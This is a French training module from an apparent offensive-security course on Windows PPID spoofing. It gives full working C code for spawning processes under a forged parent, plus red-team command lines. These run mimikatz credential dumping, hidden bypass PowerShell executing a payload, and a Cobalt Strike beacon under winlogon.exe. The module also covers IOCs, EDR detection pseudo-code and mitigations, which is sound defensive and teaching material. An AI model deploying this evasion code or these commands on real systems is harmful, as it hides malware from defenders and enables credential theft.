# Module W42 : PPID Spoofing - Falsification du Parent Process ID

## Objectifs

- Comprendre l'arbre de processus Windows et le PPID
- Implémenter PPID Spoofing via UpdateProcThreadAttribute
- Masquer l'origine d'un processus malveillant
- Bypasser les détections basées sur la chaîne de parenté

## 1. Le Parent Process ID (PPID)

### 1.1 Arbre de processus Windows

```
Arbre de processus normal
═════════════════════════

System (PID: 4)
├─ smss.exe (PID: 320)
├─ csrss.exe (PID: 400)
├─ wininit.exe (PID: 450)
│  ├─ services.exe (PID: 500)
│  │  ├─ svchost.exe (PID: 600)
│  │  └─ spoolsv.exe (PID: 700)
│  └─ lsass.exe (PID: 550)
└─ winlogon.exe (PID: 480)
   └─ userinit.exe (PID: 800)
      └─ explorer.exe (PID: 1000)  ◄─ Desktop shell
         ├─ chrome.exe (PID: 1500)
         ├─ notepad.exe (PID: 1600)
         └─ cmd.exe (PID: 1700)  ◄─ Normal
```

**PPID = Parent Process ID** : Identifiant du processus parent.

### 1.2 Détection via PPID

**Anomalie détectable** :
```
Processus suspect
═════════════════

explorer.exe (PID: 1000)
├─ chrome.exe (PID: 1500)     ✓ Normal
├─ notepad.exe (PID: 1600)    ✓ Normal
└─ powershell.exe (PID: 1700) ✗ SUSPECT!
   └─ mimikatz.exe (PID: 1800)  ◄─ TRÈS SUSPECT!
```

**EDR/SIEM Règle** :
```
IF (process.name == "powershell.exe" &&
    process.ppid != explorer.exe &&
    process.commandline contains "bypass") {
    ALERT("Powershell suspect");
}
```

## 2. PPID Spoofing

### 2.1 Principe

**Objectif** : Faire croire qu'un processus malveillant a un parent légitime.

**Schéma** :
```
AVANT PPID Spoofing
═══════════════════

cmd.exe (PID: 2000)  ◄─ Processus malveillant
└─ mimikatz.exe (PID: 2100)  ◄─ PPID = 2000 (suspect!)

APRÈS PPID Spoofing
═══════════════════

explorer.exe (PID: 1000)  ◄─ Parent "légitime"
├─ chrome.exe (PID: 1500)
└─ mimikatz.exe (PID: 2100)  ◄─ PPID = 1000 (semble légitime)

cmd.exe (PID: 2000)  ◄─ Processus malveillant (mais mimikatz n'est plus son enfant)
```

### 2.2 Implémentation

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Trouve le PID d'un processus par nom
DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Crée un processus avec PPID spoofé
BOOL CreateProcessWithSpoofedPPID(
    const wchar_t* targetParentName,
    const wchar_t* commandLine
) {
    printf("[*] PPID Spoofing\n");

    // 1. Trouver le PID du parent cible
    DWORD targetPpid = FindProcessByName(targetParentName);
    if (targetPpid == 0) {
        printf("[-] Processus parent '%ls' introuvable\n", targetParentName);
        return FALSE;
    }

    printf("[+] Parent cible: %ls (PID: %d)\n", targetParentName, targetPpid);

    // 2. Ouvrir le processus parent
    HANDLE hParentProcess = OpenProcess(
        PROCESS_CREATE_PROCESS,  // Droit nécessaire
        FALSE,
        targetPpid
    );

    if (hParentProcess == NULL) {
        printf("[-] Erreur OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 3. Initialiser STARTUPINFOEX
    STARTUPINFOEXW siex = { 0 };
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    // Déterminer la taille nécessaire pour AttributeList
    SIZE_T attributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);

    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        attributeListSize
    );

    if (!siex.lpAttributeList) {
        printf("[-] Erreur HeapAlloc\n");
        CloseHandle(hParentProcess);
        return FALSE;
    }

    // 4. Initialiser la liste d'attributs
    if (!InitializeProcThreadAttributeList(
        siex.lpAttributeList,
        1,
        0,
        &attributeListSize
    )) {
        printf("[-] Erreur InitializeProcThreadAttributeList: %d\n",
               GetLastError());
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hParentProcess);
        return FALSE;
    }

    // 5. Ajouter l'attribut PARENT_PROCESS
    if (!UpdateProcThreadAttribute(
        siex.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProcess,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        printf("[-] Erreur UpdateProcThreadAttribute: %d\n", GetLastError());
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hParentProcess);
        return FALSE;
    }

    printf("[+] Attribut PARENT_PROCESS configuré\n");

    // 6. Créer le processus avec PPID spoofé
    PROCESS_INFORMATION pi = { 0 };

    wchar_t cmdLine[MAX_PATH];
    wcscpy_s(cmdLine, MAX_PATH, commandLine);

    BOOL success = CreateProcessW(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,  // Flag important!
        NULL,
        NULL,
        (LPSTARTUPINFOW)&siex,
        &pi
    );

    if (!success) {
        printf("[-] Erreur CreateProcess: %d\n", GetLastError());
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hParentProcess);
        return FALSE;
    }

    printf("[+] Processus créé avec succès!\n");
    printf("[+] PID: %d\n", pi.dwProcessId);
    printf("[+] PPID spoofé: %d (%ls)\n", targetPpid, targetParentName);

    // 7. Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(siex.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    CloseHandle(hParentProcess);

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        wprintf(L"Usage: %s <parent_process> <command_line>\n", argv[0]);
        wprintf(L"Exemple: %s explorer.exe \"cmd.exe /c whoami\"\n", argv[0]);
        return 1;
    }

    const wchar_t* parentProcess = argv[1];
    const wchar_t* commandLine = argv[2];

    if (!CreateProcessWithSpoofedPPID(parentProcess, commandLine)) {
        wprintf(L"[-] PPID Spoofing échoué\n");
        return 1;
    }

    wprintf(L"[+] PPID Spoofing réussi\n");
    return 0;
}
```

## 3. Applications Offensives

### 3.1 Scénarios Red Team

**Scénario 1 : Lancer Mimikatz depuis explorer.exe**
```c
CreateProcessWithSpoofedPPID(
    L"explorer.exe",
    L"C:\\Tools\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\""
);
```

**Scénario 2 : PowerShell depuis un processus système**
```c
CreateProcessWithSpoofedPPID(
    L"svchost.exe",
    L"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C \"IEX(Get-Content payload.ps1)\""
);
```

**Scénario 3 : Beacon Cobalt Strike depuis WinLogon**
```c
CreateProcessWithSpoofedPPID(
    L"winlogon.exe",
    L"C:\\beacon.exe"
);
```

## 4. Détection et Mitigations

### 4.1 IOCs

**Anomalies détectables** :
```
1. PPID incohérent avec le contexte
   - cmd.exe avec PPID = winlogon.exe (impossible normalement)

2. Processus avec PPID terminé
   - PID 2000 (terminé) est le parent de PID 3000 (actif)

3. Arguments de CreateProcess suspects
   - Utilisation de EXTENDED_STARTUPINFO_PRESENT

4. Permissions insuffisantes
   - Processus utilisateur avec PPID = system process
```

### 4.2 Détection EDR

```c
// Pseudo-code EDR
ON_PROCESS_CREATE(new_process) {
    HANDLE hParent = OpenProcess(new_process.ppid);

    // Vérification 1: Le parent existe-t-il?
    if (hParent == NULL) {
        ALERT("Parent process doesn't exist");
    }

    // Vérification 2: Cohérence temporelle
    if (new_process.creation_time < parent.creation_time) {
        ALERT("Child created before parent");
    }

    // Vérification 3: Cohérence de session
    if (new_process.session_id != parent.session_id) {
        ALERT("Session ID mismatch");
    }

    // Vérification 4: Intégrité du parent
    if (parent.integrity_level < new_process.integrity_level) {
        ALERT("Child has higher integrity than parent");
    }
}
```

### 4.3 Mitigations

**Défenseurs** :
- Monitoring des appels à UpdateProcThreadAttribute
- Corrélation PPID avec call stack
- Vérification des tokens de sécurité parent/enfant
- ETW pour logger les créations de processus

## 5. Limitations

**PPID Spoofing NE PEUT PAS** :
- Hériter du token du parent (toujours le token du créateur)
- Bypasser UAC
- Escalader les privilèges
- Hériter des handles du faux parent

**PPID Spoofing PEUT** :
- Tromper les analystes SOC
- Bypasser certaines règles SIEM basiques
- Masquer la chaîne d'exécution dans Process Explorer/Hacker

## 6. Checklist

- [ ] Je comprends le concept de PPID
- [ ] Je sais implémenter PPID Spoofing
- [ ] Je connais les limitations
- [ ] Je peux détecter le PPID Spoofing

## Exercices

Voir [exercice.md](exercice.md)

---

**Navigation**
- [Module précédent : W41 Anti-Debug](../W41_anti_debug/)
- [Module suivant : W43 Callback Evasion](../W43_callback_evasion/)
